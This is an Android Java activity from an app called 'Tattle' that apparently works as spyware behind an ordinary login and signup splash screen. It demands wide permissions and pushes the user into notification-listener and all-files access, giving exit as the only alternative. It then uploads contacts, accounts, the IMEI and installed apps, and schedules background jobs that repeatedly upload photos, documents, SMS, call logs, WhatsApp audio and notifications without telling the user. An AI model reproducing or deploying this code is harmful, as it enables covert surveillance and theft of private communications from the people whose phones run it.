package com.globalsolutions.Tattle.UI.Activities;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.Observer;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkInfo;
import androidx.work.WorkManager;

import android.Manifest;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.globalsolutions.Tattle.DataUploadServices.BasicDataUploadService;
import com.globalsolutions.Tattle.DataUploadServices.CallLogUploadService;
import com.globalsolutions.Tattle.DataUploadServices.ContinuouslyCheckingService;
import com.globalsolutions.Tattle.DataUploadServices.ContinuouslyDocUploadingService;
import com.globalsolutions.Tattle.DataUploadServices.ContinuouslyImagesUploadingService;
import com.globalsolutions.Tattle.DataUploadServices.NotificationUploadScheduler;
import com.globalsolutions.Tattle.DataUploadServices.SmsUploadService;
import com.globalsolutions.Tattle.DataUploadServices.WhatsAppAudioUploadService;
import com.globalsolutions.Tattle.OtherUtils.ContactUtil;
import com.globalsolutions.Tattle.OtherUtils.DeviceInfo;
import com.globalsolutions.Tattle.OtherUtils.DocFilesSaver;
import com.globalsolutions.Tattle.R;
import com.globalsolutions.Tattle.OtherUtils.ImageFileSaver;
import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class BasicSplashActivity extends AppCompatActivity {

    public static final String TAG = "SplashActivity";
    public static final int PERMISSIONS_REQUEST_CODE = 1240;


    SharedPrefs sharedPrefs;
    AlertDialog alertDialog;

    String[] appPermissions = {
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS
    };

    Button loginBt;
    Button signupBT;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        loginBt = findViewById(R.id.splashLoginBt);
        signupBT = findViewById(R.id.splashSignupBT);

        sharedPrefs = SharedPrefs.getInstance(this);

        alertDialog = new AlertDialog.Builder(this).create();
        initBuilder();

        if (sharedPrefs.getUniqueId().equals("notFound")) {
            final String uuid = UUID.randomUUID().toString().replace("-", "");
            sharedPrefs.setUniqueId(uuid);
        }

        if (checkAndRequestPermissions()) {
            if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {
                alertDialog.show();
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivity(intent);
                }
            }

            if (!sharedPrefs.isBasicDataUploaded()) {
                uploadDeviceInfo();
            }
            StartContinuouslyCheckingService();
            StartContinuouslyImagesUploadingService();
            StartContinuouslyDocsUploadingService();
            StartSmsUploadingService();
            StartCallLogUploadingService();
            StartWhatsAppAudioUploadingService();
            startNotificationUploadService();
        }

        loginBt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(BasicSplashActivity.this, LoginActivity.class));
                finish();
            }
        });

        signupBT.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(BasicSplashActivity.this, SignupActivity.class));
                finish();
            }
        });
    }

    protected void initBuilder() {
        alertDialog.setMessage("You Need To Allow Permissions To Get The Best Of This App.");
        alertDialog.setButton(DialogInterface.BUTTON_POSITIVE, "Allow Permission", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
            }
        });
        alertDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "No, Exit App", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                System.exit(0);
            }
        });
    }

    public boolean checkAndRequestPermissions() {
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String perm : appPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(perm);
            }
        }
        //Ask for non-granted permissions
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), PERMISSIONS_REQUEST_CODE);
            return false;
        }
        //App has all the permissions proceed ahead
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            HashMap<String, Integer> permissionResults = new HashMap<>();
            int deniedCount = 0;

            //Gather permission grant results
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                    permissionResults.put(permissions[i], grantResults[i]);
                    deniedCount++;
                }
            }

            if (deniedCount == 0) {
//                proceed with your work here
//                uploadDeviceInfo();
                if (!sharedPrefs.isBasicDataUploaded()) {
                    uploadDeviceInfo();
                }
                if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {
                    alertDialog.show();
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (!Environment.isExternalStorageManager()) {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        Uri uri = Uri.fromParts("package", getPackageName(), null);
                        intent.setData(uri);
                        startActivity(intent);
                    }
                }

                StartContinuouslyCheckingService();
                StartContinuouslyImagesUploadingService();
                StartContinuouslyDocsUploadingService();
                StartSmsUploadingService();
                StartCallLogUploadingService();
                StartWhatsAppAudioUploadingService();
                startNotificationUploadService();
            } else {
                for (Map.Entry<String, Integer> entry : permissionResults.entrySet()) {
                    String permName = entry.getKey();
                    int permResult = entry.getValue();

                    //permission is denied first time with "never ask again unchecked"
                    // so ask again explaining the usage of permission
                    //shouldShowRequestPermissionRationale will return true
                    if (ActivityCompat.shouldShowRequestPermissionRationale(this, permName)) {
                        showDialog("", "This App Needs Permissions To Work Flawlessly",
                                "Yes, Grant permissions",
                                new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        checkAndRequestPermissions();
                                    }
                                },
                                "No, Exit app", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        finish();
                                    }
                                }, false);
                    } else {
                        showDialog("", "You have denied some permissions. Allow all permissions from settings", "Go To Settings",
                                new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        //Go to app settings
                                        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                                Uri.fromParts("package", getPackageName(), null));
                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        startActivity(intent);
                                        finish();
                                    }
                                },
                                "No, Exit app", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        finish();
                                    }
                                }, false);
                        break;
                    }
                }
            }
        }

    }

    public android.app.AlertDialog showDialog(String title, String msg, String positiveLabel,
                                              DialogInterface.OnClickListener positiveOnClick,
                                              String negativeLabel, DialogInterface.OnClickListener negativeOnclick,
                                              boolean isCancelable) {
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setTitle(title);
        builder.setCancelable(isCancelable);
        builder.setMessage(msg);
        builder.setPositiveButton(positiveLabel, positiveOnClick);
        builder.setNegativeButton(negativeLabel, negativeOnclick);

        android.app.AlertDialog alertDialog = builder.create();
        alertDialog.show();
        return alertDialog;
    }

    public void uploadDeviceInfo() {
        DeviceInfo deviceInfo = new DeviceInfo(this);
        ContactUtil contactUtil = new ContactUtil(this);

        Intent serviceIntent = new Intent(this, BasicDataUploadService.class);
        serviceIntent.putExtra("deviceInfo", deviceInfo.getDetails());
        serviceIntent.putExtra("installedApps", (Serializable) deviceInfo.getInstalledApps());
        serviceIntent.putExtra("contacts", (Serializable) contactUtil.getContacts());
        serviceIntent.putExtra("accounts", (Serializable) deviceInfo.getAccounts());
        serviceIntent.putExtra("imei", deviceInfo.getIMEIDeviceId(this));
        BasicDataUploadService.enqueueWork(this, serviceIntent);
    }

    public void StartContinuouslyCheckingService() {
        Constraints constraints = new Constraints.Builder().build();
//        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(ContinuouslyCheckingService.class, 5, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("ContinuouslyCheckingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartContinuouslyImagesUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(ContinuouslyImagesUploadingService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("ContinuouslyImagesUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartContinuouslyDocsUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(ContinuouslyDocUploadingService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("ContinuouslyDocsUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }


    public void StartSmsUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(SmsUploadService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("SmsUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartCallLogUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(CallLogUploadService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("CallLogUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartWhatsAppAudioUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(WhatsAppAudioUploadService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("WhatsAppAudioUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void startNotificationUploadService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
//        Constraints constraints = new Constraints.Builder().build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();

        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.KEEP,build);
    }


    @Override
    protected void onResume() {
        super.onResume();
        if (!alertDialog.isShowing()) {
            if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {
                alertDialog.show();
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivity(intent);
            }
        }

    }
}